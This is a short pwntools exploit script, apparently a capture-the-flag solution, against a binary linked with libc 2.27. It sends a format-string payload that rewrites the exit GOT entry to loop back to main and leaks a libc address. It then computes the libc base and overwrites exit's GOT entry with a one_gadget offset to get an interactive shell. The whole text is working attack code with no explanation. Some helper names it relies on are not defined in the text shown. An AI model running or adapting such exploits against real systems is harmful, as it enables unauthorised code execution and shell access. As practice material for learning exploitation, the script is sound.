from pwn import *
libc = ELF('./libc-2.27.so')
io = start(env={"LD_PRELOAD":"./libc-2.27.so"})
io.recvuntil('out!\n')

payload = fmtstr_payload(9, {exe.got['exit']: exe.sym['main']}, numbwritten=0x11)
io.sendline(b'%43$p   ' +payload )
leak = io.recvline()

idx = leak.index(b'0x')
leak = int(leak[idx+2:idx+14],16)
libc_main_ret = leak

libc.address = libc_main_ret - 0x21B97 
log.info('libc base @ {}'.format(hex(libc.address)))

one_gaget = libc.address + 0xe5863
payload = fmtstr_payload(8, {exe.got['exit']: one_gaget})
io.sendline(payload)
io.interactive()
